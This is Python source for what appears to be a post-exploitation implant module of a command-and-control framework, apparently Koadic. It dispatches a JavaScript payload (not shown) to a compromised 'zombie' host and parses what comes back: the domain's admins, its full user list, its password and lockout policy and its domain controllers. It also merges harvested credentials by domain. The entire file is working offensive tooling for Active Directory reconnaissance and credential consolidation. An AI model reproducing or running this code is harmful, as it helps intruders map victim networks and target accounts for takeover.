import core.implant

class EnumDomainInfoJob(core.job.Job):

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        task = handler.get_header("Header", False)

        if task == "Key":
            dkey = data.split("___")
            self.domain_key = tuple([i.lower() for i in dkey])
            if not self.domain_key in self.shell.domain_info:
                self.shell.domain_info[self.domain_key] = {}

            self.print_good("Detected Domain: "+dkey[0]+ " ("+dkey[1]+")")
            handler.reply(200)
            return

        if task == "Admins":
            domain_admins = data.split("___")[:-1]
            if not "Domain Admins" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Domain Admins"] = domain_admins

            da_string = "\n\t".join(domain_admins)
            self.print_good("Domain Admins:\n\t"+da_string)
            handler.reply(200)
            return

        if task == "Users":
            domain_users = data.split("___")[:-1]
            if not "Domain Users" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Domain Users"] = domain_users

            self.print_good("Domain Users retrieved: "+str(len(domain_users)))
            handler.reply(200)
            return

        if task == "PassPolicy":
            policy = data.split("___")
            if not "Password Policy" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Password Policy"] = policy

            policy_string =  "\tForce user logoff how long after time expires?:       %s\n"
            policy_string += "\tMinimum password age (days):                          %s\n"
            policy_string += "\tMaximum password age (days):                          %s\n"
            policy_string += "\tMinimum password length:                              %s\n"
            policy_string += "\tLength of password history maintained:                %s\n"
            policy_string += "\tLockout threshold:                                    %s\n"
            policy_string += "\tLockout duration (minutes):                           %s\n"
            policy_string += "\tLockout observation window (minutes):                 %s\n"
            policy_string = policy_string % tuple(policy)

            self.print_good("Domain Password Policy retrieved:\n"+policy_string)
            handler.reply(200)
            return

        if task == "DomainControllers":
            dcs = data.split("___")[:-2]
            dcs_expand = [dc.split("*") for dc in dcs]
            if not "Domain Controllers" in self.shell.domain_info[self.domain_key]:
                self.shell.domain_info[self.domain_key]["Domain Controllers"] = dcs_expand

            dc_string = "\n\t".join(["DC: %s (%s)" % tuple(dc) for dc in dcs_expand])
            self.print_good("Domain Controllers retrieved:\n\t"+dc_string)
            handler.reply(200)
            return

        if len(data) == 0:
            handler.reply(200)
            return

        if data == "Complete":
            self.consolidate_creds(self.domain_key)
            super(EnumDomainInfoJob, self).report(handler, data)

        handler.reply(200)

    def done(self):
        self.display()

    def display(self):
        pass

    def consolidate_creds(self, domain_key):
        domain_key = list(domain_key)
        domain1 = domain_key[0]
        domain2 = domain_key[1]

        tmp_creds_keys = list(self.shell.creds_keys)
        tmp_creds = dict(self.shell.creds)
        duplicates = []

        for index, creds_key in enumerate(tmp_creds_keys):
            if domain1 in creds_key or domain2 in creds_key:
                user = list(creds_key)[1]
                match_creds_key = False
                for next_creds_key in tmp_creds_keys[index+1:]:
                    if user in next_creds_key and (domain1 in next_creds_key or domain2 in next_creds_key):
                        match_creds_key = next_creds_key
                        duplicates.append(match_creds_key)
                        break
                if match_creds_key:
                    for key in tmp_creds[match_creds_key]:
                        if key == "Username" or key == "Domain":
                            continue
                        match_val = tmp_creds[match_creds_key][key]
                        orig_val = tmp_creds[creds_key][key]
                        if match_val and not orig_val:
                            # if its not in the original, then we're gonna add it
                            tmp_creds[creds_key][key] = match_val
                        if match_val and orig_val and match_val != orig_val:
                            # if we have values for both and they're not the same, add to the originals extras
                            tmp_creds[creds_key]["Extra"][key].append(match_val)
                            # flatten the list in case we append a list
                            tmp_creds[creds_key]["Extra"][key] = [item for sublist in tmp_creds[creds_key]["Extra"][key] for item in sublist]
                            # and if we actually flatten the list, remove the duplicates
                            tmp_creds[creds_key]["Extra"][key] = list(set(tmp_creds[creds_key]["Extra"][key]))

        for key in duplicates:
            del tmp_creds[key]
            tmp_creds_keys.remove(key)

        self.shell.creds_keys = tmp_creds_keys
        self.shell.creds = tmp_creds




        # tmp_creds_keys = list(self.shell.creds_keys)
        # tmp_creds_keys2 = list(tmp_creds_keys)
        # tmp_creds = dict(self.shell.creds)
        # for creds_key in tmp_creds_keys:
        #     if domain1 in creds_key:
        #         user = list(creds_key)[1]
        #         if tuple([domain2, user]) in tmp_creds_keys2:
        #             tmp_creds_keys2.remove(tuple([domain2, user]))
        #             del tmp_creds[tuple([domain2, user])]
        #     elif domain2 in creds_key:
        #         user = list(creds_key)[1]
        #         if tuple([domain1, user]) in tmp_creds_keys2:
        #             tmp_creds_keys2.remove(tuple([domain1, user]))
        #             del tmp_creds[tuple([domain1, user])]

        # self.shell.creds_keys = tmp_creds_keys2
        # self.shell.creds = tmp_creds


class EnumDomainInfoImplant(core.implant.Implant):

    NAME = "Enumerate Domain Info"
    DESCRIPTION = "Enumerates information about the domain."
    AUTHORS = ["TheNaterz"]

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

    def run(self):
        payloads = {}
        payloads["js"] = self.loader.load_script("data/implant/gather/enum_domain_info.js", self.options)

        self.dispatch(payloads, EnumDomainInfoJob)
